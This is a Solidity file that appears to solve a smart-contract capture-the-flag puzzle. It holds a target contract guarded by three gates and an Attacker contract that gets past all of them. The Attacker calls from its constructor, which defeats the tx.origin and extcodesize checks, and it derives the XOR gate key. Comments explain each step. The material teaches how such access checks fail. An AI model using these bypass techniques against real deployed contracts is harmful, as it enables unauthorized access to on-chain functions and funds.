// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAddRecorder {
    
    function callme(bytes8 _gateKey) external;
}

contract AddrRecorder is IAddRecorder{

    event Addr(address indexed sender, address indexed origin);
    event CallRCDESZ(address indexed sender, uint256 sz);
    event Sender(address indexed sender);

    modifier gate1 {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gate2 {
        uint256 callerCodeSize;

        assembly {
            callerCodeSize := extcodesize(caller())
        }
        emit CallRCDESZ(msg.sender, callerCodeSize);
        require(callerCodeSize == 0);
        _;
    }

    modifier gate3(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max, "Failed to pass gate 3.");
        _;
    }

    function callme(bytes8 _gateKey) public gate1 gate2 gate3(_gateKey) {
        emit Addr(msg.sender, tx.origin);
    }
}

contract Attacker {

    constructor (address _victimAddr){
        IAddRecorder addRecorder = IAddRecorder(_victimAddr);
        // since it is called through the constructor msg.sender will be Attacker-Contract and tx.origin will be USER, And it will pass-through gate1
        // Since this Contract has no code, this will pass through gate2
        // To pass through gate-3 use x ^ (x ^ y) = y
        // Here y => type(uint64).max & x => uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))), so
        uint64 xXORy = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        addRecorder.callme(bytes8(xXORy));
    }
}